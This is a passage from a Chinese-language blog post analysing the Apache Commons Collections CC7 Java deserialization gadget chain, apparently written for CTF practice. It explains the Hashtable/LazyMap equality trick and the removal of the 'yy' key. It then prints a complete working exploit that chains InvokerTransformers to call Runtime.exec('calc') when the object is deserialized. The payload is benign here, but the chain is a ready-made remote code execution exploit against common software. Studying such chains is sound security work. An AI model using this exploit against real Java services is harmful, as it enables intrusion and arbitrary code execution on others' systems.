+</span></span><span style=display:flex><span>ht.<span style=color:#a6e22e>put</span>(lazyMap1, <span style=color:#e6db74>&#34;value1&#34;</span>);   <span style=color:#75715e>// 第一步</span>
+</span></span><span style=display:flex><span>ht.<span style=color:#a6e22e>put</span>(lazyMap2, <span style=color:#e6db74>&#34;value2&#34;</span>);   <span style=color:#75715e>// 第二步</span>
+</span></span></code></pre></div><p>问题就在第二步上。</p><p>根据上面的分析，<code>Hashtable</code>内部会进行<code>lazyMap2.equals(lazyMap1)</code> 来判断键是否重复，从而触发<code>lazyMap1</code>内部的<code>HashMap</code>比较<code>lazyMap2</code>，从而调用<code>lazyMap2.get("yy")</code>。而<code>LazyMap.get()</code>中有一个逻辑：如果没有这个键，就调用<code>factory.transform(key)</code>并进行<code>map.put(key, value)</code>操作，也就是会把<code>yy</code>存放到<code>LazyMap</code>内部的<code>HashMap</code>中。这样我们的<code>lazyMap2</code>中就有两个键值对：<code>"zZ"->1</code>和<code>"yy"->某个值</code>，这样在反序列化重建时，在进行<code>HashMap.equals</code>时会查找<code>lazyMap2</code>，如果不删除，<code>lazyMap2</code>中有<code>yy</code>这个键，此时调用<code>lazyMap2.get</code>时其中的条件<code>map.containsKey(key) == false</code>就不满足，就不会调用到其中的<code>factory.transform(key)</code>，这样链子就断了。所以当我们<code>put</code>完成之后，就会删除<code>lazyMap2</code>的<code>yy</code>。</p><p><strong>完整 EXP</strong>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.map.LazyMap;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileInputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileOutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectInputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectOutputStream;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.HashMap;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Hashtable;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Map;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>test</span> {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>serialize</span>(Object obj) <span style=color:#66d9ef>throws</span> Exception {
+</span></span><span style=display:flex><span>        ObjectOutputStream oos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream(<span style=color:#66d9ef>new</span> FileOutputStream(<span style=color:#e6db74>&#34;ser.bin&#34;</span>));
+</span></span><span style=display:flex><span>        oos.<span style=color:#a6e22e>writeObject</span>(obj);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> Object <span style=color:#a6e22e>unserialize</span>(String Filename) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        ObjectInputStream ois <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream(<span style=color:#66d9ef>new</span> FileInputStream(Filename));
+</span></span><span style=display:flex><span>        Object obj <span style=color:#f92672>=</span> ois.<span style=color:#a6e22e>readObject</span>();
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> obj;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception{
+</span></span><span style=display:flex><span>        Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]</span>{
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ConstantTransformer(Runtime.<span style=color:#a6e22e>class</span>),
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;getMethod&#34;</span>,<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{String.<span style=color:#a6e22e>class</span>, Class<span style=color:#f92672>[]</span>.<span style=color:#a6e22e>class</span>},<span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#e6db74>&#34;getRuntime&#34;</span>,<span style=color:#66d9ef>null</span>}),
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;invoke&#34;</span>,<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{Object.<span style=color:#a6e22e>class</span>,Object<span style=color:#f92672>[]</span>.<span style=color:#a6e22e>class</span>},<span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#66d9ef>null</span>,<span style=color:#66d9ef>null</span>}),
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;exec&#34;</span>,<span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{String.<span style=color:#a6e22e>class</span>},<span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#e6db74>&#34;calc&#34;</span>})
+</span></span><span style=display:flex><span>        };
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        ChainedTransformer chainedTransformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ChainedTransformer(transformers);
+</span></span><span style=display:flex><span>        HashMap<span style=color:#f92672>&lt;</span>Object, Object<span style=color:#f92672>&gt;</span> hashMap1 <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>();
+</span></span><span style=display:flex><span>        HashMap<span style=color:#f92672>&lt;</span>Object, Object<span style=color:#f92672>&gt;</span> hashMap2 <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>();
+</span></span><span style=display:flex><span>        Map lazyMap1 <span style=color:#f92672>=</span> LazyMap.<span style=color:#a6e22e>decorate</span>(hashMap1, chainedTransformer);
+</span></span><span style=display:flex><span>        lazyMap1.<span style=color:#a6e22e>put</span>(<span style=color:#e6db74>&#34;yy&#34;</span>,1);
+</span></span><span style=display:flex><span>        Map lazyMap2 <span style=color:#f92672>=</span> LazyMap.<span style=color:#a6e22e>decorate</span>(hashMap2, chainedTransformer);
+</span></span><span style=display:flex><span>        lazyMap2.<span style=color:#a6e22e>put</span>(<span style=color:#e6db74>&#34;zZ&#34;</span>,1);
+</span></span><span style=display:flex><span>        <span style=color:#75715e>//lazyMap.get(new HashMap&lt;&gt;());</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        Hashtable<span style=color:#f92672>&lt;</span>Object, Object<span style=color:#f92672>&gt;</span> hashtable <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Hashtable<span style=color:#f92672>&lt;&gt;</span>();
+</span></span><span style=display:flex><span>        hashtable.<span style=color:#a6e22e>put</span>(lazyMap1,1);
+</span></span><span style=display:flex><span>        hashtable.<span style=color:#a6e22e>put</span>(lazyMap2,1);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        lazyMap2.<span style=color:#a6e22e>remove</span>(<span style=color:#e6db74>&#34;yy&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        serialize(hashtable);
+</span></span><span style=display:flex><span>        unserialize(<span style=color:#e6db74>&#34;ser.bin&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h2 id=总结>总结
+<a class=anchor href=#%e6%80%bb%e7%bb%93>#</a></h2><p>感觉这条链子的各种变量传递很绕，得多看看。这也让我想到一个项目思路：搞一个 java 反编译器，同时能够导出为 maven 和 gradle 项目，这样以后做到 java web 的题目就不用很麻烦的搭建题目环境了，然后再搞一个 java hook，这样追踪变量传递就很轻松了，不用花脑子想半天。</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#cc7-链分析>CC7 链分析</a></li><li><a href=#cc7-exp>CC7 EXP</a><ul><li><a href=#lazymapget-部分的-exp>LazyMap.get() 部分的 EXP</a></li><li><a href=#结合入口类编写-exp>结合入口类编写 EXP</a></li></ul></li><li><a href=#总结>总结</a></li></ul></nav></div></aside></main><script>(function(){var e,n,t=document.querySelector(".homepage-tree");t&&t.addEventListener("click",function(e){var t,n,s,i=e.target.closest(".home-tree-toggle"),a=e.target.closest(".home-section-label"),o=i||a;if(!o)return;if(s=o.closest("li"),!s)return;if(n=s.querySelector(".home-tree-children"),t=s.querySelector(".home-tree-toggle"),!n||!t)return;e.preventDefault(),n.classList.contains("hidden")?(n.classList.remove("hidden"),t.classList.remove("collapsed"),t.classList.add("expanded")):(n.classList.add("hidden"),t.classList.remove("expanded"),t.classList.add("collapsed"))}),e=document.createElement("div"),e.className="preview-tooltip",document.body.appendChild(e),document.querySelectorAll(".home-article-link[data-summary]").forEach(function(t){t.addEventListener("mouseenter",function(s){if(window.innerWidth<=768)return;var o=t.getAttribute("data-summary");if(!o)return;n=setTimeout(function(){var t,n,i=o.length>200?o.substring(0,200)+"...":o;e.textContent=i,e.style.display="block",t=s.clientX+15,n=s.clientY+15,t+420>window.innerWidth&&(t=s.clientX-420-15),n+100>window.innerHeight&&(n=s.clientY-100),e.style.left=t+"px",e.style.top=n+"px"},500)}),t.addEventListener("mouseleave",function(){clearTimeout(n),e.style.display="none"})})})()</script></body></html>
